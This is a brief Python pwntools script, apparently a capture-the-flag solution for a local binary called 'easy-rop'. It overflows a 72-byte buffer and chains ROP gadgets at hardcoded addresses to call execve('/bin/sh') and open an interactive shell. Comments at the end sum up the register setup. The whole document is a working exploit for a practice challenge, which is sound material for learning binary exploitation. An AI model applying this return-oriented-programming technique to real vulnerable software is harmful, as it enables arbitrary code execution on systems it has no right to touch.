from pwn import *

elf = context.binary = ELF('easy-rop',checksec=False)
rop = ROP(elf)
p = elf.process()

# required things
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rax = rop.find_gadget(['pop rax','ret'])[0]
syscall = rop.find_gadget(['syscall','ret'])[0]
pop_rsi = 0x000000000040f4be
pop_rdx = 0x000000000040181f
mov_rdi_rsi = 0x000000000047695e
mov_rsi_rax = 0x0000000000481e65
data_section = 0x004c00e0

# execve
payload = flat(
	b'A'*72,	
	pop_rax,
	u64('/bin/sh\x00'),
	pop_rsi,
	data_section,
	mov_rsi_rax,
	mov_rdi_rsi,

	pop_rax,
	0x3b,
	pop_rsi,
	0x0,
	pop_rdx,
	0x0,

	syscall
)

input()
p.sendlineafter('name:',payload)
p.interactive()

# execve('/bin/sh',0,0);
# rax = 59
# rsi = 0
# rdx = 0

# rdi = '/bin/sh' -> pointer
# syscall
